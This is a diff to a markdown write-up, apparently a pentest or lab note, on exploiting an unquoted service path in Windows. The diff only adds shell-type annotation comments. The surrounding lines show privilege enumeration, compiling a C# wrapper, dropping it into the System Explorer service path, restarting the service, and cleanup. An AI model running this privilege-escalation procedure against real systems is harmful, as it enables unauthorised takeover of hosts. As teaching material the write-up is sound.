@@ -17,6 +17,7 @@ When a service path like `C:\Program Files (x86)\Vendor App\Service\service.exe`
 
 ## Enumeration
 
+<!-- cmd: windows -->
 ```cmd
 whoami /priv
 whoami /groups
@@ -56,12 +57,14 @@ namespace Wrapper {
 }
 ```
 
+<!-- cmd: linux -->
 ```bash
 mcs Wrapper.cs
 ```
 
 Place the compiled executable in the vulnerable path and restart the service:
 
+<!-- cmd: windows -->
 ```cmd
 sc stop SystemExplorerHelpService
 sc start SystemExplorerHelpService
@@ -69,6 +72,7 @@ sc start SystemExplorerHelpService
 
 ## Cleanup
 
+<!-- cmd: windows -->
 ```cmd
 del "C:\Program Files (x86)\System Explorer\System.exe"
 sc start SystemExplorerHelpService
